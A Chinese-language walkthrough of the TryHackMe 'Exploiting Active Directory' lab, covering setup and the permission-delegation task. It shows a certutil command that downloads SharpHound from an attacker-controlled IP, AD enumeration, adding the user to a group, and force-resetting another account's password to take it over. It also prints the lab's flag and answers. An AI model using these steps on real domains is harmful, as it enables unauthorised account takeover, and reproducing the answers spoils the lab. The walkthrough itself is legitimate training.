# 前置代理

这个房间我在本地无法直连vpn，需要加前置代理

## ssh
只能转发tcp

ssh动态绑定本地转发端口
```
ssh -N -D 127.0.0.1:9050 root@xxxx
```
在ovpn最前面加这两行
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.83.101     #THMDC的ip
nameserver 114.114.114.114   #真实的DNS地址，以保证kali还能连接网络
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[~]
└─# nslookup thmdc.za.tryhackme.loc
Server:         10.200.83.101
Address:        10.200.83.101#53

Name:   thmdc.za.tryhackme.loc
Address: 10.200.83.101

```

# 获取用户凭据

登录```http://distributor.za.tryhackme.loc/creds```生成一个用户登录凭据

```
Your credentials have been generated: Username: max.smith Password: Kdbt1458
```

ssh登录
```
ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc
```

# Task 2  Exploiting Permission Delegation


ACE

**ForceChangePassword**：我们可以在不知道用户当前密码的情况下设置用户当前密码。
**AddMembers**：我们有能力将用户（包括我们自己的帐户）、组或计算机添加到目标组。
**GenericAll**：我们可以完全控制对象，包括更改用户密码、注册 SPN 或将 AD 对象添加到目标组的能力。
**GenericWrite**：我们可以更新目标对象的任何非保护参数。例如，这可以让我们更新 scriptPath 参数，这将导致脚本在用户下次登录时执行。
**WriteOwner**：我们有能力更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的额外权限。
**WriteDACL**：我们有能力将新的 ACE 写入目标对象的DACL。例如，我们可以编写一个 ACE，授予我们的帐户对目标对象的完全控制权。
**AllExtendedRights**：我们能够针对目标对象执行与扩展 AD 权限相关的任何操作。例如，这包括强制更改用户密码的能力。


thm提供的json我本地无法识别，重新收集一份
```
PS C:\Users\max.smith\Documents> certutil -urlcache -split -f "http://10.50.81.218/SharpHound.exe" SharpHound.exe   
****  Online  ****
  000000  ...
CertUtil: -URLCache command completed successfully.
PS C:\Users\max.smith\Documents> .\SharpHound.exe -c all
-----------------------------------------------
Initializing SharpHound at 9:43 AM on 8/11/2022
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container


[+] Creating Schema map for domain ZA.TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=ZA,DC=TRYHACKME,DC=LOC 
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 17 MB RAM
[+] Creating Schema map for domain TRYHACKME.LOC using path CN=Schema,CN=Configuration,DC=TRYHACKME,DC=LOC
Status: 5128 objects finished (+5128 512.8)/s -- Using 58 MB RAM
Enumeration finished in 00:00:10.7635721
Compressing data to .\20220811094325_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 9:43 AM on 8/11/2022! Happy Graphing!

PS C:\Users\max.smith\Documents> ls


    Directory: C:\Users\max.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/11/2022   9:43 AM         307482 20220811094325_BloodHound.zip
-a----        8/11/2022   9:42 AM         833536 SharpHound.exe
-a----        8/11/2022   9:43 AM        1092647 Y2Y1YjhlMjMtNjA5Ny00YjA5LWFmOTMtZTc5YjA1NTU3YzNm.bin


```


拷贝回kali
```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# scp za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc:C:/Users/max.smith/Documents/20220811094325_BloodHound.zip .
za.tryhackme.loc\max.smith@thmwrk1.za.tryhackme.loc's password: 
20220811092711_BloodHound.zip   
```

从本用户到```TIER 2 ADMINS```的一条攻击路径


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660208864433.jpg)


本用户（max）属于```Domain users```用户组

```Domain users```用户组可以添加任何成员到```IT SUPPORT```用户组

```IT SUPPORT```用户组可以强制更改用户```T2_HENRY.HARVEY```的密码

用户```T2_HENRY.HARVEY```属于```TIER 2 ADMINS```用户组



首先，将当前账号添加进```IT Support```用户组，然后用Get-ADGroupMember验证添加结果
```
PS C:\> Add-ADGroupMember "IT Support" -Members "max.smith"
PS C:\> Get-ADGroupMember -Identity "IT Support"

...
...
distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : max.smith
objectClass       : user
objectGUID        : f0cd5ecd-6a42-4eff-8015-071e1dc3747b
SamAccountName    : max.smith
SID               : S-1-5-21-3885271727-2693558621-2658995185-1142

```


获取"Tier 2 Admins"组成员，看到有t2_henry.harvey的信息
```
PS C:\> Get-ADGroupMember -Identity "Tier 2 Admins"

...
...

distinguishedName : CN=t2_henry.harvey,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t2_henry.harvey
objectClass       : user
objectGUID        : a3c2db31-6362-4af7-8a3e-20e0c16a664f
SamAccountName    : t2_henry.harvey
SID               : S-1-5-21-3885271727-2693558621-2658995185-4275

```


强制修改密码,报错报Access is denied
```
PS C:\> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force 
PS C:\> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password               
Set-ADAccountPassword : Access is denied 
At line:1 char:1
+ Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (t2_henry.harvey:ADAccount) [Set-ADAccountPassword], UnauthorizedA  
   ccessException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.M  
   anagement.Commands.SetADAccountPassword

```

教程说需要等10分钟断开再连ssh测试,原因是：

> 权限尚未通过域传播。这最多可能需要 10 分钟。最好的方法是终止您的 SSH 或RDP会话，稍作休息，然后重新验证并重试。您也可以运行gpupdate /force然后断开连接并重新连接，这在某些情况下会导致同步发生得更快

几分钟后再次修改，修改成功
```
PS C:\Users\max.smith> $Password = ConvertTo-SecureString "max.123456" -AsPlainText -Force
PS C:\Users\max.smith> Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password
PS C:\Users\max.smith>  

```

现在可以通过```t2_henry.harvey:max.123456```登录ssh
```
┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# ssh za.tryhackme.loc\\t2_henry.harvey@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\t2_henry.harvey@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>whoami
za\t2_henry.harvey

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>hostname
THMWRK1

za\t2_henry.harvey@THMWRK1 C:\Users\t2_henry.harvey>

```

> Which ACE would allow you to update any non-protected parameter of a target object?

> GenericWrite

> What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?

> THM{Permission.Delegation.FTW!}

# Task 3  Exploiting Kerberos Delegation

